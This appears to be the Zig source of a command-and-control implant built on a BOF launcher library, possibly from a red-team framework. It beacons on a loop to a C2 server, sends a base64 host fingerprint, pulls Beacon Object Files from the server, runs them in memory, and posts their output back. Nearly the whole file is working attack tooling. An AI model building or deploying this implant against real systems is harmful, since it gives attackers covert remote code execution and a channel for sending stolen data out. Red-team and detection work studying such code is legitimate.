const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");

pub const std_options = struct {
    pub const http_disable_tls = true;
    pub const log_level = .info;
};
const enable_debug_http_proxy = false;
const c2_host = "127.0.0.1:8000";
const c2_endpoint = "/endpoint";
const jitter = 3;

fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]const u8 {
    var h = std.http.Headers{ .allocator = allocator };
    defer h.deinit();

    var http_client: std.http.Client = .{
        .allocator = allocator,
        .http_proxy = if (enable_debug_http_proxy) .{
            .allocator = allocator,
            .headers = h,
            .protocol = .plain,
            .host = "127.0.0.1",
            .port = 8080,
        } else null,
    };
    defer http_client.deinit();

    var buf: [256]u8 = undefined;
    const uri = try std.fmt.bufPrint(&buf, "http://{s}{s}", .{ c2_host, bof_uri });
    const bof_url = try std.Uri.parse(uri);
    var bof_req = try http_client.open(.GET, bof_url, h, .{});
    defer bof_req.deinit();

    try bof_req.send(.{});
    try bof_req.wait();

    if (bof_req.response.status != .ok) {
        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(bof_req.response.status),
            bof_req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const bof_content_type = bof_req.response.headers.getFirstValue("Content-Type") orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    if (!std.ascii.eqlIgnoreCase(bof_content_type, "application/octet-stream")) {
        std.log.err(
            "Expected 'Content-Type: application/octet-stream' got '{s}'",
            .{bof_content_type},
        );
        return error.NetworkError;
    }

    const bof_content = try allocator.alloc(u8, @intCast(bof_req.response.content_length.?));
    errdefer allocator.free(bof_content);

    const n = try bof_req.readAll(bof_content);
    if (n != bof_content.len)
        return error.NetworkError;

    return bof_content;
}

const State = struct {
    base64_encoder: std.base64.Base64Encoder,
    http_client: std.http.Client,
    heartbeat_header: std.http.Headers,
    heartbeat_uri: std.Uri,

    fn init(allocator: std.mem.Allocator) !State {
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        var heartbeat_header = std.http.Headers{ .allocator = allocator };

        const http_client: std.http.Client = .{
            .allocator = allocator,
            .http_proxy = if (enable_debug_http_proxy) .{
                .allocator = allocator,
                .headers = heartbeat_header,
                .protocol = .plain,
                .host = "127.0.0.1",
                .port = 8080,
            } else null,
        };

        {
            const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
            const arch_name = target.cpu.model.name;
            const os_name = @tagName(target.os.tag);

            // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
            const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
            defer allocator.free(authz);

            const authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
            defer allocator.free(authz_b64);

            _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
            try heartbeat_header.append("Authorization", authz_b64);
        }

        return State{
            .base64_encoder = base64_encoder,
            .http_client = http_client,
            .heartbeat_header = heartbeat_header,
            .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
        };
    }

    fn deinit(state: *State) void {
        state.http_client.deinit();
        state.heartbeat_header.deinit();
    }
};

fn process(allocator: std.mem.Allocator, state: *State) !void {
    // send heartbeat to C2 and check if any tasks are pending
    var req = try state.http_client.open(.GET, state.heartbeat_uri, state.heartbeat_header, .{});
    defer req.deinit();

    try req.send(.{});
    try req.wait();

    if (req.response.status != .ok) {
        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(req.response.status),
            req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const content_type = req.response.headers.getFirstValue("Content-Type") orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    // task received from C2?
    if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
        const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
        defer allocator.free(resp_content);
        _ = try req.readAll(resp_content);

        var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
        defer parsed.deinit();

        // check type of task to execute:
        // bof - execute bof
        // cmd - execute builtin command (like: sleep 10)
        var root = parsed.value;
        const task = root.object.get("name").?.string;

        const request_id = root.object.get("id").?.string;

        var iter_task = std.mem.tokenize(u8, task, ":");
        const cmd_prefix = iter_task.next() orelse return error.BadData;
        const cmd_name = iter_task.next() orelse return error.BadData;

        // tasked to execute bof?
        if (std.mem.eql(u8, cmd_prefix, "bof")) {
            std.log.info("Executing bof: {s}", .{cmd_name});

            // TODO: Crashes in debug mode because `args` is `null`
            const bof_args_b64 = root.object.get("args").?.string;
            const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
            const len = try std.base64.Base64Decoder.calcSizeForSlice(&base64_decoder, bof_args_b64);
            const bof_args = try allocator.alloc(u8, len);
            defer allocator.free(bof_args);
            _ = try std.base64.Base64Decoder.decode(&base64_decoder, bof_args, bof_args_b64);

            const bof_path = root.object.get("path").?.string;

            // fetch bof content
            const bof_content = try fetchBofContent(allocator, bof_path);
            defer allocator.free(bof_content);

            const bof_object = try bof.Object.initFromMemory(bof_content);

            // process header
            const bof_header = root.object.get("header").?.string;
            var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
            const exec_mode = iter_hdr.next() orelse return error.BadData;
            //TODO: handle 'buffers'
            //const args_spec = iter_hdr.next() orelse return error.BadData;

            var bof_context: ?*bof.Context = null;

            if (std.mem.eql(u8, exec_mode, "inline")) {
                std.log.info("Execution mode: {s}-based", .{exec_mode});

                bof_context = try bof_object.run(@constCast(bof_args));
            } else if (std.mem.eql(u8, exec_mode, "thread")) {
                std.log.info("Execution mode: {s}-based", .{exec_mode});

                bof_context = try bof_object.runAsyncThread(
                    @constCast(bof_args),
                    null,
                    null,
                );
                bof_context.?.wait();
            } else if (std.mem.eql(u8, exec_mode, "process")) {
                std.log.info("Execution mode: {s}-based", .{exec_mode});
            }

            if (bof_context) |context| if (context.getOutput()) |output| {
                std.log.info("Bof output:\n{s}", .{output});

                const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
                defer allocator.free(out_b64);
                _ = std.base64.Base64Encoder.encode(&state.base64_encoder, out_b64, output);

                var h = std.http.Headers{ .allocator = allocator };
                defer h.deinit();
                try h.append("content-type", "text/plain");
                try h.append("Authorization", request_id);

                var reqRes = try state.http_client.open(.POST, state.heartbeat_uri, h, .{});
                defer reqRes.deinit();

                reqRes.transfer_encoding = .{ .content_length = out_b64.len };

                try reqRes.send(.{});
                try reqRes.writeAll(out_b64);
                try reqRes.finish();

                bof_object.release();
                context.release();
            };

            // tasked to execute builtin command?
        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
            std.log.info("Executing builtin command: {s}", .{cmd_name});
        }
    }
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var state = try State.init(allocator);
    defer state.deinit();

    try bof.initLauncher();
    defer bof.releaseLauncher();

    while (true) {
        process(allocator, &state) catch {};
        std.time.sleep(jitter * 1e9);
    }
}
